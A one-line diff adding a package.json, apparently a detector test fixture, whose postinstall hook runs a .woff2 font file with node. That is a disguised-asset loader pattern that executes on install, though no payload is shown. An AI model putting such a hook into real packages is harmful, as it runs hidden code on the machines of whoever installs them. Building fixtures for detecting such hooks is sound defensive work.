@@ -1,0 +1,1 @@
+{"name": "quoted-bare-asset", "scripts": {"postinstall": "node 'public/fonts/x.woff2'"}}
